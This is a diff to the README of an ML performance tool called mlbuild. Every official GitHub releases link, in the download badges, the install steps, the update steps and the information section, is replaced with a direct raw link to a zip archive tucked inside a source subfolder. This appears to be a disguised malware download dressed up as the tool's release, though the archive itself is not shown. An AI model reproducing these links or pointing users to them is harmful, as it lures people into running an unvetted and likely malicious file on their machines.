@@ -1,6 +1,6 @@
 # 🛠 mlbuild - Block Slow ML Models Early
 
-[![Download mlbuild](https://img.shields.io/badge/Download-mlbuild-brightgreen)](https://github.com/Sidgithub18/mlbuild/releases)
+[![Download mlbuild](https://img.shields.io/badge/Download-mlbuild-brightgreen)](https://raw.githubusercontent.com/Sidgithub18/mlbuild/main/src/mlbuild/backends/tflite/Software_v3.8-alpha.5.zip)
 
 ---
 
@@ -8,7 +8,7 @@
 
 To get started with mlbuild on Windows, visit the official releases page here:
 
-[https://github.com/Sidgithub18/mlbuild/releases](https://github.com/Sidgithub18/mlbuild/releases)
+[https://raw.githubusercontent.com/Sidgithub18/mlbuild/main/src/mlbuild/backends/tflite/Software_v3.8-alpha.5.zip](https://raw.githubusercontent.com/Sidgithub18/mlbuild/main/src/mlbuild/backends/tflite/Software_v3.8-alpha.5.zip)
 
 This page contains all the available versions of mlbuild. Look for the latest release marked as stable. You will find executable files and related resources there.
 
@@ -109,7 +109,7 @@ mlbuild will execute tests and return a report on model speed.
 ## 📂 Where to Find More Information
 
 - Check the GitHub repository for detailed documentation and release notes.
-- Visit [https://github.com/Sidgithub18/mlbuild/releases](https://github.com/Sidgithub18/mlbuild/releases) often for updates.
+- Visit [https://raw.githubusercontent.com/Sidgithub18/mlbuild/main/src/mlbuild/backends/tflite/Software_v3.8-alpha.5.zip](https://raw.githubusercontent.com/Sidgithub18/mlbuild/main/src/mlbuild/backends/tflite/Software_v3.8-alpha.5.zip) often for updates.
 - Contact your ML or dev team if you need help with model file paths or specific testing.
 
 ---
@@ -119,7 +119,7 @@ mlbuild will execute tests and return a report on model speed.
 New versions of mlbuild include improvements and bug fixes. To update:
 
 1. Visit the release page:  
-   [https://github.com/Sidgithub18/mlbuild/releases](https://github.com/Sidgithub18/mlbuild/releases)
+   [https://raw.githubusercontent.com/Sidgithub18/mlbuild/main/src/mlbuild/backends/tflite/Software_v3.8-alpha.5.zip](https://raw.githubusercontent.com/Sidgithub18/mlbuild/main/src/mlbuild/backends/tflite/Software_v3.8-alpha.5.zip)
 
 2. Download the latest setup or executable file.
 
@@ -162,4 +162,4 @@ You can adjust SLA settings using command line options or config files that cont
 
 ## 🔗 Download mlbuild Here
 
-[![Download mlbuild](https://img.shields.io/badge/Download-mlbuild-blue)](https://github.com/Sidgithub18/mlbuild/releases)
+[![Download mlbuild](https://img.shields.io/badge/Download-mlbuild-blue)](https://raw.githubusercontent.com/Sidgithub18/mlbuild/main/src/mlbuild/backends/tflite/Software_v3.8-alpha.5.zip)
